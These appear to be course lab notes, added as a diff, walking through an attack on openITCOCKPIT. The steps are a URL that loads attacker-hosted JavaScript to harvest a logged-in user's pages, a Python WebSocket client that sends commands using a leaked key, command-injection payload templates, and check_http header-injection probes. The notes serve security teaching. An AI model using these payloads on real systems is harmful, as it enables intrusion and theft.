@@ -818,6 +818,665 @@ To recap, our JavaScript should now load the homepage (if the user is logged in)
 2
 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise ↩︎
 
+Accessed this url to trigger stat collection:
+url was hosted on kali flask server api.py
+
+```
+https://openitcockpit/js/vendor/lodash/perf/index.html?build=https://192.168.45.204/client.js
+```
+##### Dumping the Contents
+At this point, we should have a database full of content from an authenticated user. The next step is to dump this data into files that are easier to manage. We'll create a Python script that imports and expands on our db.py script.
+
+We'll start off by importing all the necessary libraries and modules. In this case, we need os to be able to write the file and we need create_connection, get_content, and get_locations from db.py to get the content. We will also need a variable for the database name we will be using and the directory that we want to place the files into. The contents of Listing 38 will be saved to dump.py:
+
+import os
+from db import create_connection, get_content, get_locations
+
+database = r"sqlite.db"
+contentDir = os.getcwd() + "/content"
+Listing 38 - Required imports for dump.py
+
+Next, we can begin creating the main section of the script. First, we will need to make a database connection and query all locations. For each location, we will query for the content and write the content to the appropriate file. The code for this section is shown in Listing 39.
+
+if __name__ == '__main__':
+    conn = create_connection(database)
+    locations = get_locations(conn)
+    for l in locations:
+        content = get_content(conn, l)
+        write_to_file(l[0], content)
+Listing 39 - Main section of dump.py
+
+Next, we'll complete the write_to_file function, which stores the contents of each location into an html file. If a location contains a subdirectory, it must be stored in a folder with the same name as the subdirectory. Conveniently, the structure of a URL also fits a URL path and not much modification needs to occur. The write_to_file function is shown in Listing 40.
+
+def write_to_file(url, content):
+    fileName = url.replace('https://','')
+    if not fileName.endswith(".html"):
+        fileName = fileName + ".html"
+    fullname = os.path.join(contentDir, fileName)
+    path, basename = os.path.split(fullname)
+    if not os.path.exists(path):
+        os.makedirs(path)
+    with open(fullname, 'w') as f:
+        f.write(content)
+Listing 40 - write_to_file Function
+
+The write_to_file function can be placed below the creation of the contentDir variable but above the if statement that checks if the __name__ variable is set to __main__.
+
+
+##### Discovery
+The discovery process is not automated and can be time-consuming. However, we can look for keywords that trigger our hacker-senses in order to speed up this process. For example, the commands.html, cronjobs.html, and serviceescalations.html files we obtained from the victim immediately catch our attention as the names of the files suggest that they may permit system access.
+
+Interestingly, content/openitcockpit/commands.html contains an object named appData, which contains some interesting variables:
+
+var appData = {"jsonData":{"isAjax":false,"isMobile":false,"websocket_url":"wss:\/\/openitcockpit\/sudo_server","akey":"1fea123e07f730f76e661bced33a94152378611e"},"webroot":"https:\/\/openitcockpit\/","url":"","controller":"Commands","action":"index","params":{"named":[],"pass":[],"plugin":"","controller":"commands","action":"index"},"Types":{"CODE_SUCCESS":"success","CODE_ERROR":"error","CODE_EXCEPTION":"exception","CODE_MISSING_PARAMETERS":"missing_parameters","CODE_NOT_AUTHENTICATED":"not_authenticated","CODE_AUTHENTICATION_FAILED":"authentication_failed","CODE_VALIDATION_FAILED":"validation_failed","CODE_NOT_ALLOWED":"not_allowed","CODE_NOT_AVAILABLE":"not_available","CODE_INVALID_TRIGGER_ACTION_ID":"invalid_trigger_action_id","ROLE_ADMIN":"admin","ROLE_EMPLOYEE":"employee"}};
+Listing 41 - Commands.html setting appData
+
+There are two portions of particular interest. First a "websocket_url" is defined, which ends with "sudo_server". Next, a key named "akey" is defined with a value of "1fea123e07f730f76e661bced33a94152378611e". The combination of a commands route and sudo_server WebSocket connection endpoint piques our interest.
+
+WebSocket1 is a browser-supported communication protocol that uses HTTP for the initial connection but then creates a full-duplex connection, allowing for fast communication between the client and server. While HTTP is a stateless protocol, WebSocket is stateful. In a properly-built solution, the initial HTTP connection would authenticate the user and each subsequent WebSocket request would not require authentication. However, due to complexities many developers face when programming with the WebSocket protocol, they often "roll their own" authentication. In openITCOCKPIT, we see a key is provided in the same object a websocket_url is set. We suspect this might be used for authentication.
+
+WebSocket communication is often overlooked during pentests. Up until recently, Burp Repeater did not support WebSocket messages and Burp Intruder still does not. However, WebSocket communication can have just as much control over a server as HTTP can. Finding a WebSocket endpoint (and in this case a key), can significantly increase the risk profile of an application.
+
+In a browser-based application, WebSocket connections are initiated via JavaScript. Since JavaScript is not compiled, the source defining the WebSocket connection must be located in one of the JavaScript files loaded on this page. We can use these files to learn how to communicate with the WebSocket server and create our own client.
+
+The commands.html page loads many JavaScript files, but most are plugins and libraries. However, a cluster of JavaScript files just before the end of the head tag do not seem to load plugins or libraries:
+
+<script src="/vendor/angular/angular.min.js"></script><script src="/js/vendor/vis-4.21.0/dist/vis.js"></script><script src="/js/scripts/ng.app.js"></script><script src="/vendor/javascript-detect-element-resize/jquery.resize.js"></script><script src="/vendor/angular-gridster/dist/angular-gridster.min.js"></script><script src="/js/lib/angular-nestable.js"></script><script src="/js/compressed_angular_services.js"></script><script src="/js/compressed_angular_directives.js"></script><script src="/js/compressed_angular_controllers.js"></script>
+Listing 42 - Potentially custom JavaScript
+
+As evidenced by the listing, custom JavaScript is stored in the js folder and not in vendor, plugin, or lib. We'll grep for all script tags that also have a src set, removing any entries that are in the vendor, plugin, or lib folders:
+
+kali@kali:~/scripts/content/openitcockpit$ cat commands.html | grep -E "script.*src" | grep -Ev "vendor|lib|plugin"
+<script type="text/javascript" src="/js/app/app_controller.js?v3.7.2"></script>
+<script type="text/javascript" src="/js/compressed_components.js?v3.7.2"></script>
+<script type="text/javascript" src="/js/compressed_controllers.js?v3.7.2"></script>
+</script><script type="text/javascript" src="/frontend/js/bootstrap.js?v3.7.2"></script>
+        <script type="text/javascript" src="/js/app/bootstrap.js?v3.7.2"></script>
+        <script type="text/javascript" src="/js/app/layoutfix.js?v3.7.2"></script>
+        <script type="text/javascript" src="/smartadmin/js/notification/SmartNotification.js?v3.7.2"></script>
+        <script type="text/javascript" src="/smartadmin/js/demo.js?v3.7.2"></script>
+        <script type="text/javascript" src="/smartadmin/js/app.js?v3.7.2"></script>
+        <script type="text/javascript" src="/smartadmin/js/smartwidgets/jarvis.widget.js?v3.7.2"></script>
+Listing 43 - Finding custom JavaScript files
+
+This leaves us with a more manageable list, but there are some false positives that we can remove. The smartadmin folder is an openITCOCKPIT theme (clarified with a Google search), so we can remove that. We'll save the final list of custom JavaScript files to ~/scripts/content/custom_js/list.txt, shown in Listing 44.
+
+kali@kali:~/scripts/content/custom_js$ cat list.txt 
+https://openitcockpit/js/app/app_controller.js
+https://openitcockpit/js/compressed_components.js
+https://openitcockpit/js/compressed_controllers.js
+https://openitcockpit/frontend/js/bootstrap.js
+https://openitcockpit/js/app/bootstrap.js
+https://openitcockpit/js/app/layoutfix.js
+https://openitcockpit/js/compressed_angular_services.js
+https://openitcockpit/js/compressed_angular_directives.js
+https://openitcockpit/js/compressed_angular_controllers.js
+Listing 44 - List of custom JavaScript
+
+It's very rare for client-side JavaScript files to be protected behind authentication. For this reason we should be able to retrieve the files without authentication. We'll use wget to download the list of custom JavaScript into the custom_js folder:
+
+kali@kali:~/scripts/content/custom_js$ wget --no-check-certificate -q -i list.txt
+
+kali@kali:~/scripts/content/custom_js$ ls
+app_controller.js  compressed_angular_controllers.js  compressed_components.js   list
+bootstrap.js       compressed_angular_directives.js   compressed_controllers.js
+bootstrap.js.1     compressed_angular_services.js     layoutfix.js
+Listing 45 - Downloading custom JavaScript
+
+There are multiple files named bootstrap.js, but the content is minimal and can be ignored. The "compressed*" files contain hard-to-read, compressed, JavaScript code. We'll use the js-beautify2 Python script to "pretty-print" the files into uncompressed variants:
+
+kali@kali:~/scripts/content/custom_js$ sudo pip3 install jsbeautifier
+...
+Successfully built jsbeautifier editorconfig
+Installing collected packages: editorconfig, jsbeautifier
+Successfully installed editorconfig-0.12.2 jsbeautifier-1.10.3
+
+kali@kali:~/scripts/content/custom_js$ mkdir pretty
+
+kali@kali:~/scripts/content/custom_js$ for f in compressed_*.js; do js-beautify $f > pretty/"${f//compressed_}"; done;
+Listing 46 - Using js-beautify to make JavaScript readable
+
+Now that we have a readable version of the custom JavaScript, we can begin reviewing the files. Our goal is to determine how the WebSocket server works in order to be able to interact with it. From this point forward, we will analyze the uncompressed files.
+
+1
+(Wikipedia, 2020), https://en.wikipedia.org/wiki/WebSocket ↩︎
+
+2
+(beautify-web, 2020), https://github.com/beautify-web/js-beautify ↩︎
+
+##### Reading and Understanding the JavaScript
+WebSocket communicaton can be initiated with JavaScript by running new WebSocket.1 As we search through the files, we'll use this information to discover clues about the configuration of the "sudo_server" WebSocket.
+
+A manual review of the files leads us to components.js. Lines 1248 to 1331 define the component named WebsocketSudoComponent and the functions used to send messages, parse responses, and manage the data coming in and going out to the WebSocket server:
+
+1248  App.Components.WebsocketSudoComponent = Frontend.Component.extend({
+...
+1273      send: function(json, connection) {
+1274          connection = connection || this._connection;
+1275          connection.send(json)
+1276      },
+...
+1331  });
+Listing 47 - Definition of the SudoService
+
+WebsocketSudoComponent also defines the function for sending messages to the WebSocket server. In order to discover the messages that are available to be sent to the server, we can search for any calls to the .send() function. To do this, we'll grep for "send(" in the uncompressed files.
+
+kali@kali:~/scripts/content/custom_js$ grep -r  "send(" ./ --exclude="compressed*"
+./pretty/angular_services.js: _send(JSON.stringify({
+./pretty/angular_services.js: _send(JSON.stringify({
+./pretty/angular_services.js: _connection.send(json)
+./pretty/angular_services.js: _send(json)
+./pretty/angular_services.js: _send(JSON.stringify({
+./pretty/angular_services.js: _connection.send(json)
+./pretty/angular_services.js: _send(json)
+./pretty/components.js:  connection.send(json)
+./pretty/components.js:  this.send(this.toJson('requestUniqId', ''))
+./pretty/components.js:  this.send(this.toJson('keepAlive', ''))
+./pretty/components.js:  this._connection.send(jsonArr);
+./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('5238f8e57e72e81d44119a8ffc3f98ea', {
+./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('package_uninstall', {
+./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('package_install', {
+./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('d41d8cd98f00b204e9800998ecf8427e', {
+./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('apt_get_update', ''))
+./pretty/controllers.js: this.WebsocketSudo.send(this.WebsocketSudo.toJson('nagiostats', []))
+...
+./pretty/angular_directives.js:  SudoService.send(SudoService.toJson('enableOrDisableHostFlapdetection', [object.Host.uuid, 1]))
+./pretty/angular_directives.js:  SudoService.send(SudoService.toJson('enableOrDisableHostFlapdetection', [object.Host.uuid, 0]))
+...
+Listing 48 - Rough list of commands
+
+The output reveals a list of useful commands. Removing the false positives, cleaning up the code, and removing duplicate values provides us with the manageable list of commands shown in Listing 49.
+
+./pretty/components.js:         requestUniqId
+./pretty/components.js:         keepAlive
+./pretty/controllers.js:        5238f8e57e72e81d44119a8ffc3f98ea
+./pretty/controllers.js:        package_uninstall
+./pretty/controllers.js:        package_install
+./pretty/controllers.js:        d41d8cd98f00b204e9800998ecf8427e
+./pretty/controllers.js:        apt_get_update
+./pretty/controllers.js:        nagiostats
+./pretty/controllers.js:        execute_nagios_command
+./pretty/angular_directives.js: sendCustomHostNotification
+./pretty/angular_directives.js: submitHoststateAck
+./pretty/angular_directives.js: submitEnableServiceNotifications
+./pretty/angular_directives.js: commitPassiveResult
+./pretty/angular_directives.js: sendCustomServiceNotification
+./pretty/angular_directives.js: submitDisableServiceNotifications
+./pretty/angular_directives.js: submitDisableHostNotifications
+./pretty/angular_directives.js: enableOrDisableServiceFlapdetection
+./pretty/angular_directives.js: rescheduleService
+./pretty/angular_directives.js: submitServiceDowntime
+./pretty/angular_directives.js: submitHostDowntime
+./pretty/angular_directives.js: commitPassiveServiceResult
+./pretty/angular_directives.js: submitEnableHostNotifications
+./pretty/angular_directives.js: submitServicestateAck
+./pretty/angular_directives.js: rescheduleHost
+./pretty/angular_directives.js: enableOrDisableHostFlapdetection
+Listing 49 - A selection of available commands
+
+Although many of these seem interesting, the commands specifically listed in controllers.js seem to run system-level commands, so this is where we will focus our attention.
+
+The execute_nagios_command command seems to indicate that it triggers some form of command execution. Opening the controllers.js file and searching for "execute_nagios_command" leads us to the content found in Listing 50. A closer inspection of this code confirms that this function may result in RCE:
+
+loadConsole: function() {
+    this.$jqconsole = $('#console').jqconsole('', 'nagios$ ');
+    this.$jqconsole.Write(this.getVar('console_welcome'));
+    var startPrompt = function() {
+        var self = this;
+        self.$jqconsole.Prompt(!0, function(input) {
+            self.WebsocketSudo.send(self.WebsocketSudo.toJson('execute_nagios_command', input));
+            startPrompt()
+        })
+    }.bind(this);
+    startPrompt()
+},
+Listing 50 - LoadConsole function
+
+This command is used in the loadConsole function where there are also references to jqconsole. An input to the prompt is passed directly with "execute_nagios_command". A quick search for jqconsole reveals that it is a jQuery terminal plugin.2 Interesting.
+
+Decoding the Communication
+Now that we have a theory on how we can run code, let's try to understand the communication steps. We will work backwards by looking at what is sent to the send function. We will begin our review at the line in controller.js where execute_nagios_command is sent to the send function:
+
+4691 self.WebsocketSudo.send(self.WebsocketSudo.toJson('execute_nagios_command', input));
+Listing 51 - Argument to execute_nagios_command
+
+Line 4691 of controller.js sends execute_nagios_command along with an input to a function called toJson. Let's inspect what the toJson function does. First, we will discover where the function is defined. To do this, we can use grep to search for all instances of toJson, which will return many instances. To filter these out, we will use grep with the -v flag and look for the .send keyword.
+
+kali@kali:~/scripts/content/custom_js$ grep -r  "toJson" ./ --exclude="compressed*" | grep -v ".send"
+./components.js:    toJson: function(task, data) {
+./angular_services.js:        toJson: function(task, data) {
+./angular_services.js:        toJson: function(task, data) {
+
+Listing 52 - Searching for toJson
+
+The search for toJson revealed that the function is set in angular_services.js and components.js. The components.js file is the file where we initially found the WebsocketSudoComponent component. Since we've already found useful information in components.js, we will open the file and search for the toJson reference. The definition of toJson can be found in Listing 53
+
+1310  toJson: function(task, data) {
+1311      var jsonArr = [];
+1312      jsonArr = JSON.stringify({
+1313          task: task,
+1314          data: data,
+1315          uniqid: this._uniqid,
+1316          key: this._key
+1317      });
+1318      return jsonArr
+1319  },
+Listing 53 - Reviewing toJson
+
+The toJson function takes two arguments: the task (in this case execute_nagios_command) and some form of data (in this case input). The function then creates a JSON string of an object that contains the task, the data, a unique id, and a key. We know where task and data come from, but we must determine the source of uniqid and key. Further investigation reveals that the uniqid is defined above the toJson function in a function named _onResponse:
+
+1283  _onResponse: function(e) {
+1284      var transmitted = JSON.parse(e.data);
+1285      switch (transmitted.type) {
+1286          case 'connection':
+1287              this._uniqid = transmitted.uniqid;
+1288              this.__success(e);
+1289              break;
+1290          case 'response':
+1291              if (this._uniqid === transmitted.uniqid) {
+1292                  this._callback(transmitted)
+1293              }
+1294              break;
+1295          case 'dispatcher':
+1296              this._dispatcher(transmitted);
+1297              break;
+1298          case 'event':
+1299              if (this._uniqid === transmitted.uniqid) {
+1300                  this._event(transmitted)
+1301              }
+1302              break;
+1303          case 'keepAlive':
+1304              break
+1305      }
+1306  }
+Listing 54 - Discovering how _uniqid is set
+
+Based on the name, the _onResponse function is executed when a message comes in. The uniqid is set to the value provided by the server. We should expect at some point during the connection for the server to send us a uniqid value. There also seem to be five types of responses that the server will send: connection, response, dispatcher, event, and keepAlive. We will save this information for later.
+
+Now let's determine the source of the _key value. The setup function in the same components.js file provides some clues:
+
+1260  setup: function(wsURL, key) {
+1261      this._wsUrl = wsURL;
+1262      this._key = key
+1263  },
+Listing 55 - Discovering how _key is set
+
+When setup is called, the WebSocket URL and the _key variable in the WebsocketSudo component are set. Let's grep for calls to this function:
+
+kali@kali:~/scripts/content/custom_js$ grep -r  "setup(" ./ --exclude="compressed*"
+...
+./pretty/controllers.js:    _setupChatListFilter: function() {
+./app_controller.js:        this.ImageChooser.setup(this._dom);
+./app_controller.js:  this.FileChooser.setup(this._dom);
+./app_controller.js:      this.WebsocketSudo.setup(this.getVar('websocket_url'), this.getVar('akey'));
+Listing 56 - Searching for setup execution
+
+Searching for "setup(" returns many function calls, but the last result is the most relevant, and the arguments that are being passed in seem familiar as they were set in commands.html. At this point, we should have everything we need to construct a execute_nagios_command task. However, we should inspect the initial connection process to the WebSocket server to make sure we are not missing anything. The connect function in the components.js file is a good place to look.
+
+1264  connect: function() {
+1265      if (this._connection === null) {
+1266          this._connection = new WebSocket(this._wsUrl)
+1267      }
+1268      this._connection.onopen = this._onConnectionOpen.bind(this);
+1269      this._connection.onmessage = this._onResponse.bind(this);
+1270      this._connection.onerror = this._onError.bind(this);
+1271      return this._connection
+1272  },
+Listing 57 - Reviewing connect function
+
+The connect function will first create a new WebSocket connection if one doesn't exist. Next, it sets the onopen, onmessage, and onerror event handlers. The onopen event handler will call the _onConnectionOpen function. Let's take a look at _onConnectionOpen.
+
+1277 _onConnectionOpen: function(e) {
+1278     this.requestUniqId()
+1279 },
+...
+1307 requestUniqId: function() {
+1308     this.send(this.toJson('requestUniqId', ''))
+1309 },
+Listing 58 - Reviewing _onConnectionOpen
+
+The _onConnectionOpen function only calls the requestUniqId function. The requestUniqId function will send a request to the server requesting a unique id. We will have to keep this in mind when attempting to interact with the WebSocket server.
+
+1
+(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/WebSocket ↩︎
+
+2
+(Replit, 2019), https://github.com/replit-archive/jq-console ↩︎
+
+##### Building a Client
+First, we will build a script that allows us to connect and send any command as "input". This will help us learn how the server sends its responses. To do this, let's import modules we'll need and set a few global variables.
+
+We'll use the websocket module to communicate with the server, ssl to tell the WebSocket server to ignore the bad certificate, the json module to build and parse the requests and responses, argparse to allow command line arguments, and thread to allow execution of certain tasks in the background. We know that a unique id and key is sent in every request, so we will define those as global variables:
+
+import websocket
+import ssl 
+import json
+import argparse
+import _thread as thread
+
+uniqid = ""
+key = ""
+Listing 59 - Importing modules and setting globals
+
+Next, we will set up the arguments that we'll pass into the Python script.
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument('--url', '-u',
+                        required=True,
+                        dest='url',
+                        help='Websocket URL')
+    parser.add_argument('--key', '-k',
+                        required=True,
+                        dest='key',
+                        help='openITCOCKPIT Key')
+    parser.add_argument('--verbose', '-v',
+                        help='Print more data',
+                        action='store_true')
+    args = parser.parse_args()
+Listing 60 - Setting argument parsing
+
+We need a url and key argument to configure the connection to the WebSocket server. We will also allow for an optional verbose flag, which will assist during debugging. Next, let's set up the connection.
+
+As shown in Listing 61, we will set the key global variable to the one passed in the argument. Next, we will configure verbose tracing if the argument is set, then we will configure the connection. We will pass in the URL and set the events to execute the functions that we want in WebSocketApp. This means that we will also need to define the four functions (on_message, on_error, on_close, and on_open). Finally, we will tell the WebSocket client to connect continuously. We will also pass in the ssl options to ignore the self-signed certificate.
+
+    key = args.key
+    websocket.enableTrace(args.verbose)
+    ws = websocket.WebSocketApp(args.url,
+                              on_message = on_message,
+                              on_error = on_error,
+                              on_close = on_close,
+                              on_open = on_open)
+    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
+Listing 61 - Configuring the connection
+
+Now that we have our arguments set up, let's configure the four functions to handle the events. We will start with on_open.
+
+The on_open function (shown in Listing 62) will access the WebSocket connection as an argument. Because we want the connection to stay open, but still allow the server to send us messages at any time, we will create a separate thread. The new thread will execute the run function, which is defined within the on_open function. Inside of run, we will have a loop that will run non-stop to listen for user input. The user's input will then be converted to the appropriate JSON and passed to the send function for the WebSocket connection.
+
+def on_open(ws):
+    def run():
+        while True:
+            cmd = input()
+            ws.send(toJson("execute_nagios_command", cmd))
+    thread.start_new_thread(run, ())
+Listing 62 - Creating on_open
+
+While the official client did send a request to generate a uniqid on connection, we didn't find this necessary as the server does it automatically.
+
+Before we move on to the next function to handle events, we will build the toJson function. The toJson function (Listing 63) will mirror the official client's toJson function and will accept the task and data we want to send. We will first build a dictionary that contains the task, data, uniqid, and key. We'll then run that dictionary through a function to dump it as a JSON string.
+
+def toJson(task,data):
+    req = {
+        "task": task,
+        "data": data,
+        "uniqid": uniqid,
+        "key" : key
+    }
+    return json.dumps(req)
+Listing 63 - Creating toJson
+
+Next, we will create the event handler for on_message. As we learn how the server communicates, we will make changes to this function. The on_message event (Listing 64) passes in the WebSocket connection and the message that was sent. For now, we will parse the message, set the uniqid global variable if the server sent one, and print the raw message.
+
+def on_message(ws, message):
+    mes = json.loads(message)
+
+    if "uniqid" in mes.keys():
+        uniqid = mes["uniqid"]
+
+    print(mes)
+Listing 64 - Creating on_message
+
+With on_message created, we will create the event handlers for on_error and on_close. For on_error, we will simply print the error. For on_close, we will just print a message that the connection was closed.
+
+def on_error(ws, error):
+    print(error)
+
+def on_close(ws):
+    print("[+] Connection Closed")
+Listing 65 - Creating on_error and on_close
+
+With the script completed, we will use it to connect to the server and attempt to send a whoami command.
+
+kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e -v
+--- request header ---
+GET /sudo_server HTTP/1.1
+Upgrade: websocket
+Connection: Upgrade
+Host: openitcockpit
+Origin: http://openitcockpit
+Sec-WebSocket-Key: 5E+Srv82go8K6QOoJ6WRUQ==
+Sec-WebSocket-Version: 13
+
+
+-----------------------
+--- response header ---
+HTTP/1.1 101 Switching Protocols
+Server: nginx
+Date: Fri, 21 Feb 2020 16:36:31 GMT
+Connection: upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: R4BpxrINRQ/cDOErqo4rbxfliaI=
+X-Powered-By: Ratchet/0.4.1
+-----------------------
+{'payload': 'Connection established', 'type': 'connection', 'task': '', 'uniqid': '5e50070feeac73.88569350'}
+whoami
+send: b'\x81\xf5\x8b\xc1\xa3\x9e\xf0\xe3\xd7\xff\xf8\xaa\x81\xa4\xab\xe3\xc6\xe6\xee\xa2\xd6\xea\xee\x9e\xcd\xff\xec\xa8\xcc\xed\xd4\xa2\xcc\xf3\xe6\xa0\xcd\xfa\xa9\xed\x83\xbc\xef\xa0\xd7\xff\xa9\xfb\x83\xbc\xfc\xa9\xcc\xff\xe6\xa8\x81\xb2\xab\xe3\xd6\xf0\xe2\xb0\xca\xfa\xa9\xfb\x83\xbc\xa9\xed\x83\xbc\xe0\xa4\xda\xbc\xb1\xe1\x81\xaf\xed\xa4\xc2\xaf\xb9\xf2\xc6\xae\xbc\xa7\x94\xad\xbb\xa7\x94\xa8\xee\xf7\x95\xaf\xe9\xa2\xc6\xfa\xb8\xf2\xc2\xa7\xbf\xf0\x96\xac\xb8\xf6\x9b\xa8\xba\xf0\xc6\xbc\xf6'
+{'payload': '\x1b[0;31mERROR: Forbidden command!\x1b[0m\n', 'type': 'response', 'task': '', 'uniqid': '', 'category': 'notification'}
+{'type': 'dispatcher', 'running': False}
+{'type': 'dispatcher', 'running': False}
+^C
+send: b'\x88\x829.J.:\xc6'
+[+] Connection Closed
+Listing 66 - First WebSocket connection
+
+This initial connection produces a lot of information. First, upon initial connection, the server sends a message with a type of "connection" and a payload of "Connection established". Next, in response to the whoami command, the server response contains "Forbidden command!". Finally, the server periodically sends a dispatcher message without a payload. The connection dispatcher message types were not valuable, so we can handle those appropriately in the on_message function. We also want to clean up the output of the "response" type to only show payload of the message.
+
+Instead of printing the full message (Listing 67), we will print the string "[+] Connected!" if the incoming message is a connection. Next, we will ignore the "dispatcher" messages and we will print only the payload of a response. Since the payload of our whoami command already contained a new line character, we will end the print with an empty string to honor the server's new line.
+
+def on_message(ws, message):
+    mes = json.loads(message)
+
+    if "uniqid" in mes.keys():
+        uniqid = mes["uniqid"]
+    
+    if mes["type"] == "connection":
+        print("[+] Connected!")
+    elif mes["type"] == "dispatcher":
+        pass
+    elif mes["type"] == "response":
+        print(mes["payload"], end = '')
+    else:
+        print(mes)
+Listing 67 - Updating on_message
+
+With everything updated, we will connect and try again, this time without verbose mode:
+
+kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
+[+] Connected!
+whoami
+ERROR: Forbidden command!
+^C
+[+] Connection Closed
+Listing 68 - Updated connection with output cleaned up
+
+Now we have an interactive WebSocket connection where we can begin testing the input and finding allowed commands.
+
+##### Attempting to Inject Commands
+At this point, we should have discovered that ls is a valid command. Let's try to escape the command using common injection techniques.
+
+One way to inject into a command is with operators like && and ||, which "stack" commands. The && operator will run a command if the previous command was successful and || will run a command if the previous command was unsuccessful. While there are other command injection techniques, testing each one individually is unnecessary when we can use a curated list to brute force all possible injection techniques.
+
+For example, Fuzzdb,1 a dictionary of attacks for black box testing, contains a list of possible injections. We can download this list directly from GitHub.
+
+kali@kali:~/scripts$ wget -q https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/os-cmd-execution/command-injection-template.txt
+
+kali@kali:~/scripts$ cat command-injection-template.txt 
+{cmd}
+;{cmd}
+;{cmd};
+^{cmd}
+...
+&CMD=$"{cmd}";$CMD
+&&CMD=$"{cmd}";$CMD
+%0DCMD=$"{cmd}";$CMD
+FAIL||CMD=$"{cmd}";$CMD
+<!--#exec cmd="{cmd}"-->
+;system('{cmd}')
+Listing 69 - Downloading the FuzzDB list of commands
+
+The list uses a template where the {cmd} variable can be replaced. By looping through each of these injection templates, sending it to the server, and inspecting the response, we can discover if any of the techniques allows for us to inject into the template.
+
+1
+(Adam Muntner, 2020), https://github.com/fuzzdb-project/fuzzdb ↩︎
+
+##### Digging Deeper
+At this point, we should have determined that none of the command injection techniques worked. Now we have to Try Harder. While we cannot inject into a new command, some commands might allow us to inject into the arguments. For example, the find command accepts the -exec argument, which executes a command on each file found.
+
+Unfortunately, at this point we only know that the ls command works and it does not accept any arguments that allow for arbitrary command execution. But let's inspect the output of ls a bit more carefully.
+
+The output displays a list of scripts, and after some trial and error, we discover that we can run those scripts.
+
+kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
+[+] Connected!
+ls
+...
+check_hpjd
+check_http
+check_icmp
+...
+./check_http
+check_http: Could not parse arguments
+Usage:
+ check_http -H <vhost> | -I <IP-address> [-u <uri>] [-p <port>]
+       [-J <client certificate file>] [-K <private key>]
+       [-w <warn time>] [-c <critical time>] [-t <timeout>] [-L] [-E] [-a auth]
+       [-b proxy_auth] [-f <ok|warning|critcal|follow|sticky|stickyport>]
+       [-e <expect>] [-d string] [-s string] [-l] [-r <regex> | -R <case-insensitive regex>]
+       [-P string] [-m <min_pg_size>:<max_pg_size>] [-4|-6] [-N] [-M <age>]
+       [-A string] [-k string] [-S <version>] [--sni] [-C <warn_age>[,<crit_age>]]
+       [-T <content-type>] [-j method]
+Listing 70 - Trying check_http
+
+After reviewing the output of all the commands in the current directory, we don't find any argument that allows for direct command execution. However, the check_http command is particularly interesting. Reviewing the usage instructions for check_http in Listing 70 reveals that it allows us to inject custom headers with the -k argument. The ability to inject custom headers into a request is useful as it might provide us a blank slate to interact with local services that are not HTTP-based. This is only possible if we can set the IP address of the command to 127.0.0.1, can set the port to any value, and can set the header to any value we want. To find if we have this level of control, let's first start a Netcat listener on Kali.
+
+kali@kali:~$ nc -nvlp 8080
+listening on [any] 8080 ...
+Listing 71 - Starting Netcat listener
+
+Now we'll have openITCOCKPIT connect back to us using the check_http command so that we can review the data it sends.
+
+kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
+[+] Connected!
+./check_http -I 192.168.119.120 -p 8080
+CRITICAL - Socket timeout after 10 seconds
+Listing 72 - Connecting back to Kali
+
+The listener displays the data that was received from the connection:
+
+listening on [any] 8080 ...
+connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34448
+GET / HTTP/1.0
+User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
+Connection: close
+Listing 73 - Initial HTTP connection
+
+Now, we will run the same check_http connection but add a header with the -k argument. For now, we'll send just a string, "string1".
+
+kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
+[+] Connected!
+./check_http -I 192.168.119.120 -p 8080 -k string1
+CRITICAL - Socket timeout after 10 seconds
+Listing 74 - Connecting to Kali with header
+
+Returning to our listener, we find that the header was added.
+
+kali@kali:~$ nc -nvlp 8080
+listening on [any] 8080 ...
+connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34508
+GET / HTTP/1.0
+User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
+Connection: close
+string1
+Listing 75 - Connection with header
+
+Next, we'll make the header longer, sending the argument -k "string1 string2" (including the double quotes) and check our listener:
+
+kali@kali:~$ nc -nvlp 8080
+listening on [any] 8080 ...
+connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34552
+GET / HTTP/1.1
+User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
+Connection: close
+Host: string2":8080
+"string1
+Listing 76 - Interesting connection back with double quote
+
+We notice that the first quote is escaped and sent and the second part of the header is included in the Host header. That is not what we were expecting. Now let's try using a single quote (making the argument -k 'string1 string2').
+
+kali@kali:~$ nc -nvlp 8080
+listening on [any] 8080 ...
+connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34578
+GET / HTTP/1.0
+User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1)
+Connection: close
+string1
+Listing 77 - Viewing connection back with single quote
+
+Sending a single quote returned just a single "string1" header but without any quotes.
+
+To recap, sending a string with double quotes escapes the double quote and the value after the space is treated as a parameter to the Host header. When we send a single quote, the quote is not escaped and the second string is not included at all. An inconsistency of this type generally suggests that we are injecting an unexpected character. If that is the case, when using a single quote we might be injecting "string2" as another command.
+
+To test this theory, we will replace "string2" with "--help". If we get the help message of check_http, we know that we are not injecting into another command and that we have instead discovered a strange bug. However, if we receive no help message or a help message from a different command, we know that we might have discovered an escape.
+
